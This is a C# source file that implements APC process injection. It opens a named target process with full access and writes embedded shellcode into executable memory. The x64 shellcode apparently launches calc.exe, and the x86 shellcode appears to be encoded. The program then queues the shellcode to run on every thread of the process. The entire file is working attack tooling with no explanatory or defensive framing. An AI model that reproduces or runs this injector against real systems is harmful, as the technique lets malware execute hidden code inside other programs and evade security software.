using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace APC_Injection
{
    class Program
    {

        [DllImport("kernel.dll")]
        private static extern uint GetLastError();

        [DllImport("kernel32.dll")]
        private static extern bool IsWow64Process(
            [In] IntPtr hProcess,
            [Out] out bool lpSystemInfo);

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(
           uint dwDesiredAccess,
           bool bInheritHandle,
           uint dwProcessId);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint dwSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            uint size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocEx(
           IntPtr hHandle,
           IntPtr lpStartAddr,
           uint size,
           uint flAllocationType,
           uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(
           IntPtr hProcess,
           IntPtr lpAddress,
           UIntPtr dwSize,
           uint flNewProtect,
           out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParamter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(
            IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenThread(
           ThreadAccess dwDesiredAccess,
           bool bInheritHandle,
           int dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern IntPtr QueueUserAPC(
           IntPtr pfnAPC,
           IntPtr hThread,
           IntPtr dwData);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection : uint
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PROCESS_ALL_ACCESS = 0x1F0FFF
        }

        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT
        }

        static void Main(string[] args)
        {
            Console.WriteLine("Enter your Process Name");
            string val = Console.ReadLine();
            IntPtr hProcess = GetProcessHandle(val);
            IntPtr funcAddr;

            byte[] shellcode64 = new byte[276] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x00 };

            Byte[] shellcode32 = new byte[216] {
0xba,0x78,0x44,0x36,0x83,0xd9,0xd0,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,
0x30,0x31,0x56,0x13,0x83,0xc6,0x04,0x03,0x56,0x77,0xa6,0xc3,0x7f,0x6f,0xa4,
0x2c,0x80,0x6f,0xc9,0xa5,0x65,0x5e,0xc9,0xd2,0xee,0xf0,0xf9,0x91,0xa3,0xfc,
0x72,0xf7,0x57,0x77,0xf6,0xd0,0x58,0x30,0xbd,0x06,0x56,0xc1,0xee,0x7b,0xf9,
0x41,0xed,0xaf,0xd9,0x78,0x3e,0xa2,0x18,0xbd,0x23,0x4f,0x48,0x16,0x2f,0xe2,
0x7d,0x13,0x65,0x3f,0xf5,0x6f,0x6b,0x47,0xea,0x27,0x8a,0x66,0xbd,0x3c,0xd5,
0xa8,0x3f,0x91,0x6d,0xe1,0x27,0xf6,0x48,0xbb,0xdc,0xcc,0x27,0x3a,0x35,0x1d,
0xc7,0x91,0x78,0x92,0x3a,0xeb,0xbd,0x14,0xa5,0x9e,0xb7,0x67,0x58,0x99,0x03,
0x1a,0x86,0x2c,0x90,0xbc,0x4d,0x96,0x7c,0x3d,0x81,0x41,0xf6,0x31,0x6e,0x05,
0x50,0x55,0x71,0xca,0xea,0x61,0xfa,0xed,0x3c,0xe0,0xb8,0xc9,0x98,0xa9,0x1b,
0x73,0xb8,0x17,0xcd,0x8c,0xda,0xf8,0xb2,0x28,0x90,0x14,0xa6,0x40,0xfb,0x72,
0x39,0xd6,0x81,0x30,0x39,0xe8,0x89,0x64,0x52,0xd9,0x02,0xeb,0x25,0xe6,0xc0,
0x48,0xd9,0xac,0x49,0xf8,0x72,0x69,0x18,0xb9,0x1e,0x8a,0xf6,0xfd,0x26,0x09,
0xf3,0x7d,0xdd,0x11,0x76,0x78,0x99,0x95,0x6a,0xf0,0xb2,0x73,0x8d,0xa7,0xb3,
0x51,0xee,0x26,0x20,0x39,0xf1 };

            bool value;
            value = Is64Bit(hProcess);

            Byte[] shellcode;
            if (value)
            {
                Console.WriteLine("x64 process");
                shellcode = shellcode64;
            }
            else
            {
                Console.WriteLine("x86 process");
                shellcode = shellcode32;
            }

            if (hProcess == GetCurrentProcess())
            {
                Console.WriteLine("Injecting into self");

                //Allocate Space for the shellcode in the process
                funcAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, (uint)StateEnum.MEM_COMMIT, (uint)Protection.PAGE_EXECUTE_READWRITE);
            }
           

            else
            {
                Console.WriteLine("Injecting into process " + val);

                //Allocate Space for the shellcode in the process
                funcAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, (uint)StateEnum.MEM_COMMIT, (uint)Protection.PAGE_EXECUTE_READWRITE);

            }
            Console.WriteLine("Function address: " + funcAddr);

            UIntPtr bytesWritten;
            //Write the Shellcode to the Process
            WriteProcessMemory(hProcess, funcAddr, shellcode, (uint)shellcode.Length, out bytesWritten);

            Process targetProc = GetProcess(val);

            uint temp = 0;
            VirtualProtectEx(hProcess, funcAddr, (UIntPtr)shellcode.Length, (uint)Protection.PAGE_EXECUTE_READWRITE, out temp);

            Console.WriteLine("Injecting into all threads");

            foreach (ProcessThread thread in targetProc.Threads)
            {
                Console.WriteLine("Thread id = " + thread.Id);
  
                IntPtr open_thread = OpenThread(ThreadAccess.THREAD_HIJACK, false, thread.Id);
                IntPtr ptr = QueueUserAPC(funcAddr, open_thread, IntPtr.Zero);
               

            }

        }

        public static bool Is64Bit(IntPtr process)
        {

            if (IntPtr.Size == 4) //32 bit machine, therefore process must be 32 bit
            {
                return false;
            }
            else if (IntPtr.Size == 8) //64-bit machine, therefore need to check if it is a 32bit running on 64 or 64 running on 64bit
            {
                bool value;
                IsWow64Process(process, out value);

                if (value) //if it is a Wow64 process, then it is 32-bit as we are on a 64bit system
                {
                    return false;
                }
                else //if 64 process on 64 bit system then true
                {
                    return true;
                }
            }
            return false;
        }

        static IntPtr GetProcessHandle(string s)
        {
            try
            {
                Process proc = Process.GetProcessesByName(s)[0];
                IntPtr windowHandle = OpenProcess((uint)Protection.PROCESS_ALL_ACCESS, false, (uint)proc.Id);
                return windowHandle;
            }
            catch (IndexOutOfRangeException e)
            {
                return GetCurrentProcess();
            }
        }


        static Process GetProcess(string s)
        {
            try
            {
                Process proc = Process.GetProcessesByName(s)[0];
                return proc;
            }
            catch (IndexOutOfRangeException)
            {
                return Process.GetCurrentProcess();
            }
        }
    }
}
